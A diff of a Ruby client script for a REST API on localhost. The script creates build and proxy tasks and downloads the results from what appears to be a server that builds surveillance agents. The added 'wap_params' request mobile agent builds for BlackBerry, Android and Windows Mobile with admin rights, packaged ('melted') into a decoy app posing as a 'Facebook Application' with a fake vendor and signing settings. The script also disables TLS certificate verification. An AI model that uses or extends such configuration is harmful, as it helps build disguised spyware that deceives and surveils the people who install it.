@@ -5,8 +5,8 @@ require 'open-uri'
 require 'pp'
 require 'cgi'
 
-#http = Net::HTTP.new('localhost', 443)
-http = Net::HTTP.new('localhost', 4444)
+http = Net::HTTP.new('localhost', 443)
+#http = Net::HTTP.new('localhost', 4444)
 http.use_ssl = true
 http.verify_mode = OpenSSL::SSL::VERIFY_NONE
 
@@ -264,7 +264,7 @@ if false
 end
 
 # task
-if false
+if true
 
 def REST_task(http, cookie, type, filename, params={})
   
@@ -273,15 +273,17 @@ def REST_task(http, cookie, type, filename, params={})
   
   res = http.request_post('/task/create', task_params.to_json, {'Cookie' => cookie})
   res.kind_of? Net::HTTPSuccess or fail("Cannot create task.")
+  puts res.body
   task = JSON.parse(res.body)
   puts "Created task #{task['_id']}"
   puts "TASK STATUS: #{task['status']}"
   puts
   
-  while (task['status'] != 'download_available')
+  while (task['status'] != 'download_available' and not task['status'] == 'finished')
     res = http.request_get("/task/#{task['_id']}", {'Cookie' => cookie})
+    puts res.body
     task = JSON.parse(res.body)
-    puts "#{task['current']}/#{task['total']} #{task['desc']}"
+    puts "#{task['current']}/#{task['total']} #{task['description']}"
     break if task['error'] == true
     resource = task['resource']
     sleep 0.05
@@ -290,14 +292,15 @@ def REST_task(http, cookie, type, filename, params={})
   puts "TASK STATUS: #{task['status']}"
   puts "#{task['current']}/#{task['total']} #{task['desc']}"
   
-  puts "resource: #{resource.to_s}"
-  res = http.request_get("/file/#{resource['_id']}", {'Cookie' => cookie})
-  puts "#{resource['type']}.get"
-  File.open(resource['file_name'], 'wb') do |f|
+  unless resource.nil?
+    puts "resource: #{resource.to_s}"
+    res = http.request_get("/file/#{resource['_id']}", {'Cookie' => cookie})
+    puts "#{resource['type']}.get"
+    File.open(resource['file_name'], 'wb') do |f|
     f.write res.body
   end
-  
-  puts "Written #{resource['file_name']}."
+    puts "Written #{resource['file_name']} (#{File.size(resource['file_name'])})."
+  end
   
   puts "Deleting task #{task['_id'].to_json}."
   res = http.request_post('/task/destroy', {_id: task['_id']}.to_json, {'Cookie' => cookie})
@@ -328,9 +331,28 @@ bb_params =  {params: {factory: {_id: factories.first['_id']},
                 package: {type: 'remote'}
                 }
               }
+              
+wap_params = {params: {factory: {_id: factories.first['_id']},
+                platform: 'wap',
+                        generate: {platforms: ['blackberry', 'android', 'winmo'],
+                                   binary: {demo: true, admin: true},
+                                   melt: {admin: true,
+                                          appname: 'facebook',
+                                          name: 'Facebook Application',
+                                          desc: 'Applicazione utilissima di social network',
+                                          vendor: 'face inc',
+                                          version: '1.2.3'},
+                                   sign: {edition: '5th3rd'}
+                                  }
+                        }
+              }
+              
+nia_params = {params: {proxy_id: '4ef0542e963d350d8800115e'}}
                                    
 #REST_task(http, cookie, 'build', 'android.zip', android_params)
-REST_task(http, cookie, 'build', 'bb.zip', bb_params)
+#REST_task(http, cookie, 'build', 'bb.zip', bb_params)
+#REST_task(http, cookie, 'build', nil, wap_params)
+REST_task(http, cookie, 'proxy', nil, nia_params)
 
 =begin
 sleep 3
@@ -726,7 +748,7 @@ if false
 end
 
 # agents
-if true
+if false
   res = http.request_get('/operation', {'Cookie' => cookie})
   operations = JSON.parse(res.body)
   
